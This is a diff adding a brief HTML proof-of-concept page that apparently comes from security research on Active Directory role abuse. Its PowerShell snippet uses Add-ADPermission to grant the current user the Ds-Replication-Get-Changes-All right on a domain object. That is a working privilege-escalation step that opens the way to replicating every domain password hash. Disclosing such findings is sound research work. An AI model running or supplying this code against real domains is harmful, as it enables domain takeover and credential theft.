@@ -1,0 +1,8 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>PoC 2: RBAC Add-ADPermissino</title>
+</head><body>The following Powershell code, executed by a user account with the <b>RBAC role Active Directory Permissions</b>, sets the Ds-Replication-Get-Changes-All extended right on the domain object.<br/>
+<br/>
+$id = [Security.Principal.WindowsIdentity]::GetCurrent()<br/>
+Add-ADPermission &quot;DC=test,DC=local&quot; -User $id.Name -ExtendedRights Ds-Replication-Get-Changes-All</body></html>
